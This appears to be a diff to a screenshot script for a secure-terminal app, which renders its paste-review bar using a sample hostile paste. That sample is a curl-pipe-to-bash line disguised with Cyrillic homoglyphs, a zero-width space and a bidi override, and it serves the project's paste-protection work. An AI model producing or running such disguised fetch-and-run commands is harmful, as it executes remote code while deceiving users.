@@ -4,16 +4,17 @@
 
 ## AI-Assisted
 
-"""Render the paste-warning dialog to a PNG, headless and deterministic.
+"""Render the in-window paste-review bar to a PNG, headless and deterministic.
 
-The dialog is the real one the app shows -- secure_terminal.dialog.PasteWarningDialog
--- fed a representative hostile paste (a curl | bash line whose domain and shell
-name hide Cyrillic homoglyphs, plus a zero-width and a bidi override), so the four
-side-by-side panes and the three gated buttons appear exactly as a user would see
-them. Used to generate the shot on the project's Pages site; run it again to
+The bar is the real one the app shows -- secure_terminal.review.PasteReviewBar --
+fed a representative hostile paste (a curl | bash line whose domain and shell name
+hide Cyrillic homoglyphs, plus a zero-width and a bidi override), with its Detail
+panes expanded, so the summary, the four read-only preview panes (which reuse the
+terminal's renderer) and the countdown-gated buttons appear exactly as a user
+sees them. Used to generate the shot on the project's Pages site; run it again to
 regenerate. No display is needed: it uses Qt's offscreen platform and grab().
 
-It imports the app (secure_terminal.dialog), so run it against an installed
+It imports the app (secure_terminal.review), so run it against an installed
 secure-terminal or point PYTHONPATH at a checkout:
 
     PYTHONPATH=<secure-terminal>/usr/lib/python3/dist-packages \
@@ -30,36 +31,46 @@ import sys
 # initialises, unless the caller already chose one.
 os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
 
-from PyQt6.QtWidgets import QApplication, QLabel     # noqa: E402
-from PyQt6.QtGui import QPalette, QColor             # noqa: E402
+from PyQt6.QtWidgets import QApplication, QWidget, QVBoxLayout   # noqa: E402
+from PyQt6.QtGui import QPalette, QColor                         # noqa: E402
 
-from secure_terminal.dialog import PasteWarningDialog  # noqa: E402
+from secure_terminal.review import PasteReviewBar               # noqa: E402
 
 # A paste that looks like an ordinary install one-liner but hides look-alikes and
 # invisibles: the 'a' in "example" and in "bash" are Cyrillic (U+0430), there is a
 # zero-width space (U+200B), and a right-to-left override (U+202E) reorders the
-# trailing comment. Reveal exposes them; stripped drops all non-ASCII (the domain
-# and "bash" visibly change); "with unicode" keeps the printable look-alikes but
-# still removes the bidi and zero-width. Escaped so this file stays ASCII-only.
+# trailing comment. Escaped so this file stays ASCII-only.
 PAYLOAD = ('curl -fsSL https://ex\u0430mple.com/get.sh | b\u0430sh\u200b'
            '  \u202e# trusted mirror\n')
 
-# A non-zero countdown so the shot shows the risky "Paste with unicode" button
-# disabled and counting down -- the anti-fat-finger gate, visible.
+# A non-zero countdown so the shot shows both send buttons disabled and counting
+# down -- the anti-fat-finger gate, visible.
 COUNTDOWN_SECONDS = 4
 
 
-def _light_palette(app):
-    """A neutral light palette so the shot is identical regardless of the desktop
+class _Term:
+    """Minimal stand-in for the tab that held the paste: the bar reads its theme
+    and font to style the preview panes (a real dark terminal, Hack font)."""
+    _theme = 'dark'
+
+    def current_font_family(self):
+        return 'Hack'
+
+    def dispatch_pending_paste(self, action):
+        pass
+
+
+def _dark_palette(app):
+    """The terminal's dark look, so the shot is identical regardless of the desktop
     theme the capture happens to run under (reproducible output)."""
     app.setStyle('Fusion')
     pal = QPalette()
-    pal.setColor(QPalette.ColorRole.Window, QColor('#f4f4f5'))
-    pal.setColor(QPalette.ColorRole.WindowText, QColor('#18181b'))
-    pal.setColor(QPalette.ColorRole.Base, QColor('#ffffff'))
-    pal.setColor(QPalette.ColorRole.Text, QColor('#18181b'))
-    pal.setColor(QPalette.ColorRole.Button, QColor('#e4e4e7'))
-    pal.setColor(QPalette.ColorRole.ButtonText, QColor('#18181b'))
+    pal.setColor(QPalette.ColorRole.Window, QColor('#1b1e24'))
+    pal.setColor(QPalette.ColorRole.WindowText, QColor('#e6e6e6'))
+    pal.setColor(QPalette.ColorRole.Base, QColor('#14161b'))
+    pal.setColor(QPalette.ColorRole.Text, QColor('#e6e6e6'))
+    pal.setColor(QPalette.ColorRole.Button, QColor('#2a2e37'))
+    pal.setColor(QPalette.ColorRole.ButtonText, QColor('#e6e6e6'))
     app.setPalette(pal)
 
 
@@ -70,23 +81,23 @@ def main(argv):
     out = argv[1]
 
     app = QApplication([argv[0], '-platform', os.environ['QT_QPA_PLATFORM']])
-    _light_palette(app)
+    _dark_palette(app)
 
-    dialog = PasteWarningDialog(PAYLOAD, COUNTDOWN_SECONDS)
-    # Constrain to a realistic window width and let the long instruction line
-    # wrap, so the shot matches a normal-width window instead of stretching to
-    # the instruction's one-line natural width (a presentation-only tweak; the
-    # panes, buttons and text are the real dialog's).
-    for label in dialog.findChildren(QLabel):
-        label.setWordWrap(True)
-    dialog.setFixedWidth(880)
-    dialog.adjustSize()
-    dialog.show()
-    # let the layout settle and the first countdown tick paint before grabbing
+    host = QWidget()
+    layout = QVBoxLayout(host)
+    layout.setContentsMargins(0, 0, 0, 0)
+    bar = PasteReviewBar(host)
+    layout.addWidget(bar)
+    bar.show_review(_Term(), PAYLOAD, COUNTDOWN_SECONDS)
+    bar._detail_btn.setChecked(True)        # expand the preview panes for the shot
+    host.setFixedWidth(940)
+    host.adjustSize()
+    host.show()
+    # let the layout settle and the previews render before grabbing
     app.processEvents()
     app.processEvents()
 
-    pixmap = dialog.grab()
+    pixmap = host.grab()
     if not pixmap.save(out, 'PNG'):
         sys.stderr.write('failed to write %s\n' % out)
         return 1
